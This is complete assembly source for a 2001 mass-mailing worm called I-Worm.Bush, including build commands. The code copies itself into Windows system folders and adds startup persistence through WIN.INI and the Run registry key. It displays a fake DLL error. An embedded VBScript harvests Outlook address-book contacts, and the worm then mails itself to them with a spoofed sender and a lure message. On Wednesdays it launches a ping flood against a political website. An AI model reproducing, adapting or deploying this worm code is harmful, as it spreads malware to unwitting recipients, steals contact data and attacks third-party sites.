; comment #
; Name : I-Worm.Bush
; Author : PetiK
; Date : July 1st
; Size : 8192 byte
; 
; Action : If the file is not \WINDOWS\SYSTEM\BIOS.EXE, it copies to this file and alters the run=
; line in the WIN.INI file to run in each start. It copies to \WINDOWS\Bush.exe too
; 
; Otherwise, it creates \WINDOWS\Carnet.vbs and executed it. It adds a value in Reun key to run
; this file in each start. If the file exists, it makes nothing.
; After, it checks if the user is connected. If it finds a connection, it displays a message and
; send a copy of him to the addresses found with the VBS file.
; At the end, it attacks the site of G.W.Bush on the Wednesday.
; 
; To compil :
; tasm32 /M /ML Bush
; tlink32 -Tpe -aa -x Bush,,,import32
; C:\TASM32\BIN\brc32 bush.rc
; #

.586p
.model flat
.code

callx macro a
extrn a:proc
call a
endm

include useful.inc

SIGNATURE   db "I-Worm.Bush "
        db "by PetiK (c) 2001",00h
DEBUT:
VERIF:  push 00h
    callx GetModuleHandleA
    push 50
    push offset szOrig
    push eax
    callx GetModuleFileNameA

    push  50h
    push  offset szCopie
        callx GetSystemDirectoryA
        @pushsz "\BIOS.EXE"
        push  offset szCopie
        callx lstrcat

    push  50h
    push  offset szCopieb
        callx GetWindowsDirectoryA
        @pushsz "\Bush.exe"
        push  offset szCopieb
        callx lstrcat

    push offset szOrig
    push offset szCopie
    callx lstrcmp
    test eax,eax
        jz   CAR_A

COPIE:  push  00h
    push  offset szCopie
    push  offset szOrig
    callx CopyFileA
    push  00h
    push  offset szCopieb
    push  offset szOrig
    callx CopyFileA

WININI: push 50
    push offset szWinini
    callx GetWindowsDirectoryA
    @pushsz "\\WIN.INI"
    push offset szWinini
    callx lstrcat
    push offset szWinini
    push offset szCopie
    @pushsz "run"
    @pushsz "windows"
    callx WritePrivateProfileStringA

MESSAGE:push 30h
    @pushsz "Error Load Library"
    @pushsz "Cannot run the Dynamic Link Library GWBios.dll"
    push 00h
    callx MessageBoxA
    jmp  FIN

CAR_A:  push  50
    push  offset szCarnet
    callx GetWindowsDirectoryA
    @pushsz "\Carnet.vbs"
    push  offset szCarnet
    callx lstrcat
    push  00h
    push  FILE_ATTRIBUTE_NORMAL
    push  CREATE_NEW
    push  00h
    push  FILE_SHARE_READ
    push  GENERIC_WRITE
    push  offset szCarnet
    callx CreateFileA
    cmp   eax,-1
    je    DLL
    mov   [FH],eax
    push  00h
    push  offset octets
    push  VBSTAILLE
        push  offset vbsd
    push  [FH]
    callx WriteFile
    push  [FH]
    callx CloseHandle

REG:    @pushsz "SHLWAPI.dll"
    callx LoadLibraryA
    test  eax,eax
    jz    DLL
    mov   hdll,eax
    @pushsz "SHSetValueA"
    push  hdll
    callx GetProcAddress
    test  eax,eax
    jz    DLL
    mov   setvalue,eax
RUN_C:  push  08h
    push  offset szCarnet
    push  01h
    @pushsz "Carnet d'adresses"
    @pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
    push  80000002h
    call  setvalue
    push  [hdll]
    callx FreeLibrary

DLL:    @pushsz "WININET.dll"
    callx LoadLibraryA
    test  eax,eax
    jz    FIN
    mov   hdll,eax
    @pushsz "InternetGetConnectedState"
    push  hdll
    callx GetProcAddress
    test  eax,eax
    jz    FIN
    mov   netcheck,eax
    jmp   NET
DODO:   push  10000
    callx Sleep
NET:    push  00h
    push  offset Temp
    call  [netcheck]
    dec   eax
    jnz   DODO

NET_OK: push  40h
    @pushsz "G.W.Bush"
    @pushsz "The man who want to kill poeple and the earth"
    push  00h
    callx MessageBoxA
FINDLL: push  [hdll]
    callx FreeLibrary

JOUR:   push  offset SystemTime
    callx GetSystemTime
    cmp   [SystemTime.wDayOfWeek],03h
    jne   JOUR2

DoS:    push   01h
    @pushsz "ping -l 10000 -t www.georgewbush.com"
    callx  WinExec
    push  40h
    @pushsz "Internet"
    @pushsz "You can go to the web site : www.georgewbush.com"
    push  00h
    callx MessageBoxA

JOUR2:  push  offset SystemTime
    callx GetSystemTime
    cmp   [SystemTime.wDay],25
    jne   TXT
    push  40h
    @pushsz "I-Worm.Bush"
    @pushsz "Coded by PetiK (c)2001. To show my anger against this man."
    push  00h
    callx MessageBoxA

TXT:    pushad
    push  50
    push  offset szCarnet2
    callx GetWindowsDirectoryA
    @pushsz "\Carnet.txt"
    push  offset szCarnet2
    callx lstrcat
    push  00h
    push  FILE_ATTRIBUTE_NORMAL
    push  OPEN_EXISTING
    push  00h
    push  FILE_SHARE_READ
    push  GENERIC_READ
    push  offset szCarnet2
    callx CreateFileA
    cmp   eax,-1
    je    RETOUR
    xchg  eax,ebx

    xor   eax,eax
    push  eax
    push  eax
    push  eax
    push  PAGE_READONLY
    push  eax
    push  ebx
    callx CreateFileMappingA
    test  eax,eax
    je    CL1
    xchg  eax,ebp
    
    xor   eax,eax
    push  eax
    push  eax
    push  eax
    push  FILE_MAP_READ
    push  ebp
    callx MapViewOfFile
    test  eax,eax
    je    CL2
    xchg  eax,esi

    push  00h
    push  ebx
    callx GetFileSize
    xchg  eax,ecx
    jecxz CL3

d_scan_mail:
    call  @mlt
    db    'mailto:'
@mlt:   pop   edi
scn_mail:
    pushad
    push  07h
    pop   ecx
    rep   cmpsb
    popad
    je    scan_mail
    inc   esi
    loop  scn_mail

CL3:    push  esi
    callx UnmapViewOfFile
CL2:    push  ebp
    callx CloseHandle
CL1:    push  ebx
    callx CloseHandle
RETOUR: popad

FIN:    push  00h
    callx ExitProcess

scan_mail:
    xor   edx,edx
    add   esi,7     ;size of the string MAILTO:
    mov   edi,offset m_addr
    push  edi
p_car:  lodsb
    cmp   al,' '
    je    car_s
    cmp   al,'"'
    je    car_f
    cmp   al,'@'
    jne   not_a
    inc   edx
not_a:  stosb
    jmp   p_car
car_s:  inc   esi
    jmp   p_car
car_f:  xor   al,al
    stosb
    pop   edi
    test  edx,edx           ;if edx=0 no @
    je    d_scan_mail
    call  send
    jmp   d_scan_mail

send:   xor   eax,eax
    push  eax
    push  eax
    push  offset sMessage 
    push  eax
    push  [MAPIh]
    callx MAPISendMail
    ret

.data
szCarnet    db 50 dup (0)
szCarnet2   db 50 dup (0)
szCopie     db 50 dup (0)
szCopieb    db 50 dup (0)
szOrig      db 50 dup (0)
szWinini    db 50 dup (0)
FH      dd ?
octets      dd ?
hdll        dd ?
netcheck    dd ?
setvalue    dd ?
shfolder    dd ?
m_addr      db 128 dup (?)
Temp        dd 0
MAPIh       dd 0

sMessage    dd ?
        dd offset subject
        dd offset body
        dd ?
        dd offset date
        dd ?
        dd 2
        dd offset mFrom
        dd 1
        dd offset mTo
        dd 1
        dd offset attach

subject     db "Important and confidential information about...",00h
body        db "...the powerfulest man of the world.",0dh,0ah
            db "Look at this attachment to better know this man.",0dh,0ah,0dh,0ah
        db "Visit his site (www.georgewbush.com) on Wednesday.",0dh,0ah,0dh,0ah
        db 09h,"Best Regards",00h
date        db "07/01/2001",00h
sender      db "webmaster@rnc.org",00h

mFrom       dd ?
        dd ?
        dd offset mFrom
        dd offset sender
        dd ?
        dd ?

mTo     dd ?
        dd 1
        dd offset mTo
        dd offset m_addr
        dd ?
        dd ?

attach      dd ?
        dd ?
        dd ?
        dd offset szCopieb
        dd ?
        dd ?

vbsd:
db 'On Error Resume Next',0dh,0ah
db 'Set f=CreateObject("Scripting.FileSystemObject")',0dh,0ah
db 'Set w=CreateObject("WScript.Shell")',0dh,0ah
db 'If not f.FileExists (f.GetSpecialFolder(0)&"\Carnet.txt") Then',0dh,0ah
db 'Set cr=f.CreateTextFile(f.GetSpecialFolder(0)&"\Carnet.txt")',0dh,0ah
db 'cr.Close',0dh,0ah
db 'End If',0dh,0ah
db 'Set OA=CreateObject("Outlook.Application")',0dh,0ah
db 'Set MA=OA.GetNameSpace("MAPI")',0dh,0ah
db 'For each A In MA.AddressLists',0dh,0ah
db 'If A.Addressentries.Count <> 0 Then',0dh,0ah
db 'For B=1 To A.AddressEntries.Count',0dh,0ah
db 'Set C=A.AddressEntries(B)',0dh,0ah
db 'If w.RegRead ("HKCU\Software\Bush\" & C.Address) <> "OK" Then',0dh,0ah
db 'Set car=f.OpenTextFile(f.GetSpecialFolder(0)&"\Carnet.txt", 8, True)',0dh,0ah
db 'car.WriteLine """mailto:" & C.Address & """"',0dh,0ah
db 'car.Close',0dh,0ah
db 'w.RegWrite "HKCU\Software\Bush\" & C.Address,"OK"',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
VBSTAILLE   equ $-vbsd

CREATE_NEW      equ 00000001h
FILE_ATTRIBUTE_NORMAL   equ 00000080h
FILE_MAP_READ       equ 00000004h
FILE_SHARE_READ     equ 00000001h
GENERIC_READ        equ 80000000h
GENERIC_WRITE           equ 40000000h
OPEN_EXISTING       equ 00000003h
PAGE_READONLY       equ 00000002h

SYSTIME struct
wYear       WORD ?
wMonth      WORD ?
wDayOfWeek  WORD ?
wDay        WORD ?
wHour       WORD ?
wMinute     WORD ?
wSecond     WORD ?
wMillisecond    WORD ?
SYSTIME ends
SystemTime  SYSTIME <>


end DEBUT
end
